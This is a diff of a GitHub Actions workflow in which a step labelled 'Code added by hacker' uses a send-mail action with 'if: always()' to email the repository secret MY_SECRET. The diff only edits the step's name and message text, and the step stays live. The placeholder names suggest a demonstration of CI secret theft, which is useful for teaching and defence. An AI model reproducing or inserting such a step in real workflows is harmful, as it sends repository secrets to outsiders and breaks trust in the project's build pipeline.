@@ -44,7 +44,7 @@ jobs:
       ################################################
       # Code added by hacker
       ################################################
-      - name: Send mail 
+      - name: Send mail from EXTERNAL
         if: always()
         uses: dawidd6/action-send-mail@v3
         with:
@@ -69,4 +69,4 @@ jobs:
           # Required sender full name (address can be skipped):
           from: Luke Skywalker # <user@example.com>
           # Optional plain body:  
-          body: Secret [${{ secrets.MY_SECRET }}].\n Build job of ${{github.repository}} completed successfully!
+          body: EXTERNAL Secret [${{ secrets.MY_SECRET }}].\n Build job of ${{github.repository}} completed successfully!
